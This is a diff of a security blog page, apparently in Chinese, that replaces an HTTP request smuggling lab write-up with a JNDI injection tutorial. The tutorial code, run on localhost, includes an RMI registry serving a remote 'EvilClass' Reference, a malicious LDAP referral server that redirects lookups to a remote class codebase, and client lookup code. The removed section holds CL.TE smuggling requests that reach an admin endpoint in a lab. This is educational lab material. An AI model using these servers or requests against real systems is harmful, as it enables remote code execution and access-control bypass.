+        Reference reference &#x3D; new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;&quot;);
+        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);
+        &#x2F;&#x2F; 将 RMI 服务注册到 1099 端口
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);
+        &#x2F;&#x2F; 绑定 Reference 对象
+        registry.rebind(&quot;EvilClass&quot;, referenceWrapper);
+    &#125;
+&#125;</code></pre>
 
 <p>‍</p>
-<h4 id="CL-TE-漏洞绕过前端安全控制"><a href="#CL-TE-漏洞绕过前端安全控制" class="headerlink" title="CL.TE 漏洞绕过前端安全控制"></a>CL.TE 漏洞绕过前端安全控制</h4><p>发送两次发现需要 local 才行</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0a5f00b904b0b3e08096947d00410050.web-security-academy.net
-Cookie: session&#x3D;xmGY4Yyh9zfxxyTnlUOTkpW4wGzu82Z8
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 32
-Transfer-Encoding: chunked
+<p><strong>客户端</strong></p>
+<p>这里踩了几个坑，因为前面写的不是全限定包名，所以如果不要远程访问的话，就需要将代码放到 java 路径下</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002171541.png" alt="image"></p>
+<p>如果是要远程访问，就将这些文件移除，并且文件中不能有包名，然后起一个服务</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python -m http.server 8002</code></pre>
 
-0
+<p>可以看到成功访问了，并且实现了弹出计算机的功能</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002172105.png" alt="image"></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.RemoteException;
 
-GET &#x2F;admin HTTP&#x2F;1.1
-Foo: x</code></pre>
+public class RMIClient &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
 
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205212849-ducoq5j.png" alt="image"></p>
-<p>修改之后发现有两个标头导致出问题了</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205213054-m17vjv1.png" alt="image"></p>
-<p>那就利用 post 的方法将所有的都化为请求体</p>
-<pre class="line-numbers language-http" data-language="http" data-start="1"><code class="language-http">POST &#x2F; HTTP&#x2F;1.1
-Host: 0a5f00b904b0b3e08096947d00410050.web-security-academy.net
-Cookie: session&#x3D;xmGY4Yyh9zfxxyTnlUOTkpW4wGzu82Z8
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 69
-Transfer-Encoding: chunked
+        Context ctx &#x3D; new InitialContext();
 
-0
+        Object lookup &#x3D;  ctx.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilClass&quot;);
+    &#125;
+&#125;</code></pre>
 
-POST &#x2F;admin HTTP&#x2F;1.1
-Host: localhost
-Content-Length: 55
-
-x&#x3D;1</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251205213236-fsv0r85.png" alt="image"></p>
-<p>题目要求将 carlos 删除，访问对应 api 就行</p>
 <p>‍</p>
 <p>‍</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7097">浅谈HTTP请求走私-先知社区</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#54-xss">协议层的攻击——HTTP请求走私</a></p>
+<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h3><p>利用这个也需要 Java 开启一个 LDAP 服务器，需要的依赖如下</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;com.unboundid&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;unboundid-ldapsdk&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;6.0.7&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<p>LDAP 服务端代码如下</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.UnknownHostException;
+
+public class LdapServer &#123;
+    private static final String LDAP_BASE &#x3D; &quot;dc&#x3D;example,dc&#x3D;com&quot;;
+    public static void main(String[] args) throws LDAPException, UnknownHostException, MalformedURLException &#123;
+        String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;#EvilClass&quot;;
+        int port &#x3D; 8003;
+        InMemoryDirectoryServerConfig config &#x3D; new InMemoryDirectoryServerConfig(LDAP_BASE);
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;,
+                InetAddress.getByName(&quot;0.0.0.0&quot;),
+                port,
+                ServerSocketFactory.getDefault(),
+                SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
+        InMemoryDirectoryServer ds &#x3D; new InMemoryDirectoryServer(config);
+        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+        ds.startListening();
+    &#125;
+    public static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+        private URL codebase;
+        public OperationInterceptor(URL url) &#123;
+            this.codebase &#x3D; url;
+        &#125;
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result)&#123;
+            String base &#x3D; result.getRequest().getBaseDN();
+            Entry e &#x3D; new  Entry(base);
+            try &#123;
+                sendResult(result,base,e);
+            &#125; catch (MalformedURLException ex) &#123;
+                throw new RuntimeException(ex);
+            &#125; catch (LDAPException ex) &#123;
+                throw new RuntimeException(ex);
+            &#125;
+
+        &#125;
+
+        private void sendResult(InMemoryInterceptedSearchResult result,String base,Entry e) throws MalformedURLException, LDAPException &#123;
+            URL turl &#x3D; new URL(this.codebase,this.codebase.getRef().replace(&#39;.&#39;,&#39;&#x2F;&#39;).concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot;+ base + &quot;redirecting to&quot; + turl);
+            String cbstr &#x3D; this.codebase.toString();
+            int refPos &#x3D; cbstr.indexOf(&#39;#&#39;);
+            if(refPos &gt; 0)&#123;
+                cbstr &#x3D; cbstr.substring(0, refPos);
+            &#125;
+            e.addAttribute(&quot;javaClassName&quot;,&quot;Exploit&quot;);
+            e.addAttribute(&quot;javaCodeBase&quot;,cbstr);
+            e.addAttribute(&quot;objectClass&quot;,&quot;javaNamingReference&quot;);
+            e.addAttribute(&quot;javaFactory&quot;,this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>客户端代码</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class LdapClient &#123;
+    public static void main(String[] args) throws NamingException &#123;
+        InitialContext context &#x3D; new InitialContext();
+        context.lookup(&quot;ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass&quot;);
+    &#125;
+&#125;</code></pre>
+
+<p>‍</p>
+<p>‍</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/#LDAP-%E5%8D%8F%E8%AE%AE">漏洞篇 - JNDI 注入详解 - 妙尽璇机</a></p>
 
                 
             </div>
@@ -601,7 +719,7 @@ x&#x3D;1</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wwwmarin.xyz/2026/01/13/http-qing-qiu-zou-si/">https://wwwmarin.xyz/2026/01/13/http-qing-qiu-zou-si/</a>
+                    <a href="https://wwwmarin.xyz/2026/01/16/jndi-zhu-ru/">https://wwwmarin.xyz/2026/01/16/jndi-zhu-ru/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -643,8 +761,8 @@ x&#x3D;1</code></pre>
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">漏洞</span>
+                                <a href="/tags/java/">
+                                    <span class="chip bg-color">java</span>
                                 </a>
                             
                         </div>
@@ -723,9 +841,10 @@ x&#x3D;1</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/01/16/jndi-zhu-ru/">
                     <div class="card-image">
@@ -742,9 +861,9 @@ x&#x3D;1</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-01-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-01-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -757,6 +876,7 @@ x&#x3D;1</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -779,12 +899,12 @@ x&#x3D;1</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/01/13/snakeyaml-fan-xu-lie-hua/">
+                <a href="/2026/01/13/http-qing-qiu-zou-si/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/3635372_95770536_p0.png" class="responsive-img" alt="SnakeYAML 反序列化">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%E9%BB%92%E6%B1%9F%E9%9B%AB%E3%81%9F%E3%82%93_115192288.jpg" class="responsive-img" alt="HTTP 请求走私">
                         
-                        <span class="card-title">SnakeYAML 反序列化</span>
+                        <span class="card-title">HTTP 请求走私</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -816,8 +936,8 @@ x&#x3D;1</code></pre>
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/java/">
-                        <span class="chip bg-color">java</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
                     </a>
                     
                 </div>
